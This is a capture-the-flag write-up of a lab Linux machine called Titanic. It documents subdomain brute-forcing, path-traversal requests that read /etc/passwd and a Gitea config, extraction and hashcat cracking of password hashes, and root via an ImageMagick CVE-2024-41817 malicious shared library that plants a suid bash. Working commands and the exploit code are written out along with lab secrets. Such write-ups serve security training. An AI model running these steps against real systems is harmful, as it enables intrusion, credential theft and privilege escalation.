### Summary
Nmap shows us that subdomains are in play so we use `ffuf` to find `titanic.htb` and `dev.titanic.htb`. The former provides us LFI through ticket submission and the latter is a gitea instance that gives SQL credentials and some ideas of where in the filesystem to look. Given the default gitea filesystem, we're able to LFI the config file to get the location of the database which we extract to grab credential hashes. We're able to crack a user credential, giving us SSH on the box. In the `/opt` directory, we see a shell script cron'd using a vulnerable version of `ImageMagick` allowing arbitrary code execution. We utilize this to create a suid copy of bash as root, giving us a root shell.

### Tools
- `ffuf` - subdomain brute-force
- `wappalyzer`
- `burp`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Bruteforce]]
- [[#HTTP - TCP 80]]
	- [[#titanic.htb]]
	- [[#dev.titanic.htb]]
- [[#sqlite DB]]
###### [[#User Shell - developer]]
- [[#Password Cracking]]
- [[#Enumeration]]
- [[#ImageMagick CVE-2024-41817]]
###### [[#Root Shell]]
- [[#Exploiting ImageMagick]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.19.175 -oN nmap/tcp            
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    open     http    syn-ack ttl 63
27391/tcp filtered unknown no-response
34231/tcp filtered unknown no-response
53439/tcp filtered unknown no-response
```
```sh
❯ sudo nmap -p 22,80,27391,34231,53439 -sCV -vv 10.129.19.175 -oN nmap/tcpScripts
PORT      STATE  SERVICE REASON         VERSION
22/tcp    open   ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp    open   http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
27391/tcp closed unknown reset ttl 63
34231/tcp closed unknown reset ttl 63
53439/tcp closed unknown reset ttl 63
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Looks like there are only 2 ports open, `22` and `80`
- The TTL is corresponds to a POSIX adherent system
- The OpenSSH and Apache versions indicate Ubuntu `22.04`
- There's host redirection at play, `http://titanic.htb/` 

### Subdomain Bruteforce
```sh
❯ ffuf -u "http://10.129.19.175" -H "Host: FUZZ.titanic.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac

dev           [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 36ms]
```
- We can add both `titanic.htb` and `dev.titanic.htb` to our `/etc/hosts` file

## HTTP - TCP 80
---
### titanic.htb
- Navigating to `http://titanic.htb` shows a site where we can book a trip via the titanic
- We can use `wappalyzer` to see that it's being run via Python Flask
- When we fill our the trip booking form, we download a `.json` file containing the details of our submission
- We can capture the request using `burp`:
```http
GET /download?ticket=ad6f997a-3f5b-4d8c-b1e5-511b5b772640.json HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://titanic.htb
Sec-GPC: 1
Connection: keep-alive
Referer: http://titanic.htb/book
Upgrade-Insecure-Requests: 1
Priority: u=0, i

HTTP/1.1 200 OK
Date: Tue, 10 Feb 2026 17:49:28 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename=ad6f997a-3f5b-4d8c-b1e5-511b5b772640.json
Content-Type: application/json
Content-Length: 90
Last-Modified: Tue, 10 Feb 2026 17:49:16 GMT
Cache-Control: no-cache
ETag: "1770745756.7228842-90-654119337"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"name": "Joe", "email": "a@a.a", "phone": "123", "date": "2026-02-10", "cabin": "Deluxe"}
```

- Given the filename in the parameter, we can play around with it to try and see if we've got `LFI`:
```http
GET /download?ticket=/etc/passwd HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://titanic.htb
Sec-GPC: 1
Connection: keep-alive
Referer: http://titanic.htb/book
Upgrade-Insecure-Requests: 1
Priority: u=0, i

HTTP/1.1 200 OK
Date: Tue, 10 Feb 2026 17:50:41 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/etc/passwd"
Content-Type: application/octet-stream
Content-Length: 1951
Last-Modified: Fri, 07 Feb 2025 11:16:19 GMT
Cache-Control: no-cache
ETag: "1738926979.4294043-1951-393413677"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
- We've got it!

- We can try to grab the user flag immediately in `developer`'s home directory:
```http
GET /download?ticket=/home/developer/user.txt HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://titanic.htb
Sec-GPC: 1
Connection: keep-alive
Referer: http://titanic.htb/book
Upgrade-Insecure-Requests: 1
Priority: u=0, i

HTTP/1.1 200 OK
Date: Tue, 10 Feb 2026 17:51:46 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/home/developer/user.txt"
Content-Type: text/plain; charset=utf-8
Content-Length: 33
Last-Modified: Tue, 10 Feb 2026 17:20:49 GMT
Cache-Control: no-cache
ETag: "1770744049.7989585-33-1893075274"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

537248f62acceea65a7fc4eb671f09b5
```
- The user flag is `537248f62acceea65a7fc4eb671f09b5`

### dev.titanic.htb
- Navigating to `http://dev.titanic.htb` shows us a gittea instance
- We see two repos in the explore tab
	- `docker-config`
	- `flask-app`
- The `flask-app` repo shows us the application running on `titanic.htb`, and shows us the vulnerable code leading to the LFI vulnerability:
```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400
	
    json_filepath = os.path.join(TICKETS_DIR, ticket)
	
    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```
- We can navigate to the existing `tickets` directory to find two submitted tickets and two potential usernames:
	- `rose.bukater@titanic.htb`
	- `jack.dawson@titanic.htb`

- In the `docker-config` repo, we see a `docker-compose.yml` 
```yml
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```
- Looks like a potential SQL password: `MySQLP@$$w0rd!`
- There's also a yaml file for the gitea docker compose:
```yml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

- We can find a doc on [how to install gitea with docker](https://docs.gitea.com/next/installation/install-with-docker) to see that a configuration file is stored in `/data/gitea/conf/app.ini`
- We can use the LFI vulnerability we discovered to try and read this file at `/home/developer/gitea/data/gitea/conf/app.ini`
```http
GET /download?ticket=/home/developer/gitea/data/gitea/conf/app.ini HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://titanic.htb
Sec-GPC: 1
Connection: keep-alive
Referer: http://titanic.htb/book
Upgrade-Insecure-Requests: 1
Priority: u=0, i

HTTP/1.1 200 OK
Date: Tue, 10 Feb 2026 18:07:16 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="/home/developer/gitea/data/gitea/conf/app.ini"
Content-Type: application/octet-stream
Content-Length: 2004
Last-Modified: Fri, 02 Aug 2024 10:42:14 GMT
Cache-Control: no-cache
ETag: "1722595334.8970726-2004-2176520380"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```
- There's a lot of interesting stuff here, but given we have potential db credentials, we can try to read the database at `/data/gitea/gitea.db`
- We can grab this in BURP, select all the ugly contents and convert to base64 and copy that to our clipboard, allowing us to write it to a file and then decode it from base64 via bash
	- We could also have just used `curl`

## sqlite DB
---
- We can pop open our db using `sqlite3`:
```sh
❯ sqlite3 gitea.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
access                     oauth2_grant
access_token               org_user
action                     package
action_artifact            package_blob
action_run                 package_blob_upload
action_run_index           package_cleanup_rule
action_run_job             package_file
action_runner              package_property
action_runner_token        package_version
action_schedule            project
action_schedule_spec       project_board
action_task                project_issue
action_task_output         protected_branch
action_task_step           protected_tag
action_tasks_version       public_key
action_variable            pull_auto_merge
app_state                  pull_request
attachment                 push_mirror
auth_token                 reaction
badge                      release
branch                     renamed_branch
collaboration              repo_archiver
comment                    repo_indexer_status
commit_status              repo_redirect
commit_status_index        repo_topic
commit_status_summary      repo_transfer
dbfs_data                  repo_unit
dbfs_meta                  repository
deploy_key                 review
email_address              review_state
email_hash                 secret
external_login_user        session
follow                     star
gpg_key                    stopwatch
gpg_key_import             system_setting
hook_task                  task
issue                      team
issue_assignees            team_invite
issue_content_history      team_repo
issue_dependency           team_unit
issue_index                team_user
issue_label                topic
issue_user                 tracked_time
issue_watch                two_factor
label                      upload
language_stat              user
lfs_lock                   user_badge
lfs_meta_object            user_blocking
login_source               user_open_id
milestone                  user_redirect
mirror                     user_setting
notice                     version
notification               watch
oauth2_application         webauthn_credential
oauth2_authorization_code  webhook
```
- The most interesting table here is probably `user`:
```sh
sqlite> .schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `keep_email_private` INTEGER NULL, `email_notifications_preference` TEXT DEFAULT 'enabled' NOT NULL, `passwd` TEXT NOT NULL, `passwd_hash_algo` TEXT DEFAULT 'argon2' NOT NULL, `must_change_password` INTEGER DEFAULT 0 NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER DEFAULT 0 NOT NULL, `login_name` TEXT NULL, `type` INTEGER NULL, `location` TEXT NULL, `website` TEXT NULL, `rands` TEXT NULL, `salt` TEXT NULL, `language` TEXT NULL, `description` TEXT NULL, `created_unix` INTEGER NULL, `updated_unix` INTEGER NULL, `last_login_unix` INTEGER NULL, `last_repo_visibility` INTEGER NULL, `max_repo_creation` INTEGER DEFAULT -1 NOT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `is_restricted` INTEGER DEFAULT 0 NOT NULL, `allow_git_hook` INTEGER NULL, `allow_import_local` INTEGER NULL, `allow_create_organization` INTEGER DEFAULT 1 NULL, `prohibit_login` INTEGER DEFAULT 0 NOT NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `use_custom_avatar` INTEGER NULL, `num_followers` INTEGER NULL, `num_following` INTEGER DEFAULT 0 NOT NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL, `visibility` INTEGER DEFAULT 0 NOT NULL, `repo_admin_change_team_access` INTEGER DEFAULT 0 NOT NULL, `diff_view_style` TEXT DEFAULT '' NOT NULL, `theme` TEXT DEFAULT '' NOT NULL, `keep_activity_private` INTEGER DEFAULT 0 NOT NULL);
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);
CREATE INDEX `IDX_user_is_active` ON `user` (`is_active`);
CREATE INDEX `IDX_user_created_unix` ON `user` (`created_unix`);
CREATE INDEX `IDX_user_updated_unix` ON `user` (`updated_unix`);
CREATE INDEX `IDX_user_last_login_unix` ON `user` (`last_login_unix`);

sqlite> select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
```

# User Shell - developer
## Password Cracking
---
- We know that the hash mode is `pbkdf2` but that doesn't narrow things as much as we'd like
- There's also the matter of the salt
- We can run the following command to convert this into hashcat format:
```sh
❯ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes

administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

- Now we can perform `hashcat --user` to try and crack both of these hashes:
```sh
❯ hashcat gitea.hashes ~/ctf/TOOLS/wordlist/rockyou.txt --user

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```
- Hashcat was able to crack `developer`'s password which was `25282528`
- We can verify the credentials work with `nxc`:
```sh
❯ nxc ssh 10.129.19.175 -u developer -p 25282528                 
SSH         10.129.19.175   22     10.129.19.175    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.129.19.175   22     10.129.19.175    [+] developer:25282528  Linux - Shell access!
```

## Enumeration
---
- We already have the user flag, but just for the sake of formatting:
```sh
developer@titanic:~$ cat user.txt 
537248f62acceea65a7fc4eb671f09b5
```

- `developer` isn't able to run anything with `sudo`
- We check `/opt` to see that it's not empty! There's the flask `app` directory, a `containerd` directory we can't look into, and a `scripts` directory with a shell script:
```sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```
- We don't have write access to this script, but we can tell it's being run as root on some kind of cron if we inspect the `metadata.log` file:
```sh
developer@titanic:/opt/scripts$ ls -lah /opt/app/static/assets/images/metadata.log
-rw-r----- 1 root developer 442 Feb 10 18:39 /opt/app/static/assets/images/metadata.log
```

## ImageMagick CVE-2024-41817
---
- We can inspect `ImageMagick` info with the following:
```sh
developer@titanic:/opt/scripts$ /usr/bin/magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

- We can go to the ImageMagick github repo and click the security tab to find a vulnerability with our current version [here](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)
- This is an arbitrary code execution vulnerability due to the AppImage version ImageMagick using an empty path when setting `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` environment variables while executing, which when loading malicious configuration files or shared libraries in the current working directory while executing ImageMagick can allow arbitrary code execution.
- There's a couple POCs provided, one requires the calling of `magick` to be modified so we'll not go with that one:

1. Create a shared library in the current working directory:
```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```
2. Run the `ImageMagick` with the shared library to verify the command `id` is executed:
```sh
$ ls -al
total 24
drwxr-xr-x 2 user user  4096 Jul 20 11:53 .
drwxrwxrwt 1 user user  4096 Jul 20 11:53 ..
-rwxr-xr-x 1 user user 16240 Jul 20 11:53 libxcb.so.1
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ magick /dev/null /dev/null
uid=1000(user) gid=1000(user) groups=1000(user)
```

# Root Shell
## Exploiting ImageMagick 
---
- We first need to navigate to the directory in which the script is executing `ImageMagick` and follow the steps to create the shared library
```sh
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
developer@titanic:/opt/app/static/assets/images$ magick /dev/null /dev/null
uid=1000(developer) gid=1000(developer) groups=1000(developer)
```
- Looks like it's vulnerable!
- Now we need to modify the shared library file to give us RCE:
```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/wallfly; chmod 6777 /tmp/wallfly");
    exit(0);
}
EOF
```
- lol 67
- We wait a bit for the cron to run, and then we see our suid shell in `/tmp`!
```sh
developer@titanic:/opt/app/static/assets/images$ ls -lah /tmp/wallfly 
-rwsrwsrwx 1 root root 1.4M Feb 10 19:00 /tmp/wallfly
```
- Make sure to execute this shell with the `-p` flag to elevate privileges

```sh
developer@titanic:/opt/app/static/assets/images$ /tmp/wallfly -p
wallfly-5.1# whoami
root
wallfly-5.1# cat /root/root.txt
ce0580cdddd548a1f4c0ee60737d193a
```


